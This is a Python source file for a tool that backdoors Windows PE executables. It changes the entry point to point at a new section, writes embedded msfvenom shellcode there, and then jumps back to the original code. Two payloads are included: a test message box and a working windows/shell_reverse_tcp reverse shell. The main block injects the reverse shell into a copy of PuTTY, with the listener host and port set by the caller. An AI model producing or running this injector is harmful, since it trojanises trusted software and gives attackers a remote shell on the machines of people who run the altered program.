import pefile
from config import VERBOSE
import utilities
import struct
import os
from keystone import *
import binascii

# TODO currently only works for 32 bit, 64 bit has a different packing
# scheme and opcodes


def tohex(val, nbits):
    return hex((val + (1 << nbits)) % (1 << nbits))


def to_ks(code, syntax=0):

    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    if syntax != 0:
        ks.syntax = syntax

    encoding, _ = ks.asm(code)
    # encoding = [233, 82, 237, 245, 255]
    encoding = [hex(x)[2:] for x in encoding]
    packed_command = binascii.unhexlify(''.join(encoding))
    return packed_command


def call_oep(base, oep, nep, displacement):

    loaded_oep = base + oep
    loaded_nep = base + nep + displacement
    jumpback = tohex(-loaded_nep + loaded_oep, 32)

    return to_ks(f'jmp {jumpback}')


def msgbox(oep, nep, base):

    # TODO pe-bear, firefox
    # for this example we are using the message box payload
    # msfvenom -a x86 --platform windows -p windows/messagebox \
    # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION \
    # EXITFUNC=process TITLE="Testing" -f python

    messagebox = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                       b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                       b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                       b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                       b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                       b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                       b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                       b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                       b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                       b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                       b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                       b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                       b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                       b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                       b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                       b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x6e\x67\x58\x68"
                       b"\x54\x65\x73\x74\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68"
                       b"\x3a\x29\x58\x20\x68\x6f\x64\x65\x20\x68\x75\x72\x20"
                       b"\x63\x68\x6e\x20\x79\x6f\x68\x27\x6d\x20\x69\x68\x73"
                       b"\x74\x20\x49\x68\x2c\x20\x54\x65\x68\x54\x65\x73\x74"
                       b"\x31\xc9\x88\x4c\x24\x1e\x89\xe1\x31\xd2\x6a\x40\x53"
                       b"\x51\x52\xff\xd0")

    displacement = len(messagebox)

    jmp = call_oep(base, oep, nep, displacement)

    messagebox += bytes(jmp)

    return messagebox


def reverse_shell(oep, nep, base, lhost=None, lport=8080):
    # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp
    # LHOST=192.168.1.148 LPORT=8080 -f python

    if lhost is None:
        lhost = utilities.get_ip()
    ip = utilities.ip_to_hex(lhost)

    port = struct.pack('!H', lport)

    shellcode = bytes(b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                      b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
                      b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
                      b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
                      b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
                      b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
                      b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
                      b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
                      b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
                      b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
                      b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
                      b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
                      b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
                      b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
                      b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68" + ip + b"\x68"
                      b"\x02\x00" + port + b"\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
                      b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
                      b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
                      b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
                      b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
                      b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
                      b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x90\x56\x46\xff\x30"
                      b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
                      b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
                      b"\x75\x05\xbb\x47\x13\x72\x6f")

    displacement = len(shellcode)

    jmp = call_oep(base, oep, nep, displacement)

    shellcode += bytes(jmp)

    return shellcode


def payload_selection(payload, oep, nep, base, *args, **kwargs):
    if payload in 'msgbox':
        if VERBOSE:
            print("Selecting Message Box Shellcode\n")
        return msgbox(oep, nep, base)
    elif payload in 'reverse':
        if VERBOSE:
            print("Selecting Windows TCP Reverse Shell Shellcode")
            for k, v in kwargs.items():
                print(f"\tAdditional Argument: {k}={v}")
            for a in args:
                print(f"\tAdditional Argument: {a}")
            print()
        return reverse_shell(oep, nep, base, *args, **kwargs)


def insert_payload(original_path, payload, *args, **kwargs):
    path = utilities.make_duplicate(original_path, payload)
    pe = pefile.PE(path)

    # We will first change the binaries entry point to be the newly injected
    # section this will run our injected code first
    if VERBOSE:
        print(f"Modifying Entry Point\n")
    oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[-1].VirtualAddress

    # Now we have to actually load the payload into the binary
    # To do this we need the raw address of the injected section
    raw_offset = pe.sections[-1].PointerToRawData

    # Write the shellcode into the new section
    shellcode = payload_selection(
        payload, oep, pe.sections[-1].VirtualAddress, pe.OPTIONAL_HEADER.ImageBase, *args, **kwargs)

    if VERBOSE:
        print(f"Writing shellcode to {hex(raw_offset)}\n")
    pe.set_bytes_at_offset(raw_offset, shellcode)
    pe.write(path)
    print("[x] Payload injected\n")

    utilities.delete_file(original_path)


if __name__ == "__main__":
    p = 'rev'
    path = "./assets/bin/putty_injection.exe"
    insert_payload(path, p, lhost='127.0.0.1', lport=8888)
